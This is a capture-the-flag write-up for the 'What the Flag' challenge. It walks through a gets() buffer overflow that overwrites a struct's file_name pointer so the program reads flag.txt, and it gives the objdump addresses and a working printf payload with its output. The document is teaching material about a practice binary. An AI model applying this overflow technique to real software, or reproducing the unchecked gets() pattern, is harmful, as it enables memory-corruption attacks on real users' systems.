# What the Flag Writeup
##### By sdamashek of TJ CSL

*Note: This problem could have been solved by simply symlinking `not_the_flag.txt` to `/home/what_the_flag/flag.txt` and supplying the normal password without using buffer overflows, but below I show the intended solution.*

In What The Flag, the vulnerable part of the program was pretty easy to find:

```c
puts("Enter your password too see the message:");
gets(data.password);
```

Because `gets` does not perform bounds checking, and will read until `EOF`, we can buffer overflow `data.password`. It's helpful to know the format of `data` here. `data` is a `message_data` struct:

```c
struct message_data{
    char message[128];
    char password[16];
    char *file_name;
};
```

The program, after the `gets`, checks if `data.password` is `"1337_P455W0RD"`. We need to include that in our payload, followed by a null byte, and then two filler characters because `password` is 16 bytes. However, we don't want to read `"not_the_flag.txt"`:

```c
data.file_name = "not_the_flag.txt";
// gets, password checking
read_file(data.message, data.file_name, sizeof(data.message));
```

We want to read `flag.txt`, not `not_the_flag.txt`. However, because of how C strings work, we can just change the `file_name` pointer to point to the `f`, so the string reads `flag.txt`. `objdump -s what_the_flag` shows us the addresses of the string:

```
 8048768 20726561 64206669 6c653a20 2573006e   read file: %s.n                    
 8048778 6f745f74 68655f66 6c61672e 74787400  ot_the_flag.txt.
```

From this, we can tell that the `f` in `flag.txt` is located at `0x0804877f`. So our final payload/exploit looks like this:

```bash
printf "1337_P455W0RD\x00aa\x7f\x87\x04\x08" | ./what_the_flag
Enter your password too see the message:                                          
Congratulations! Here is the flag: who_needs_%eip
```
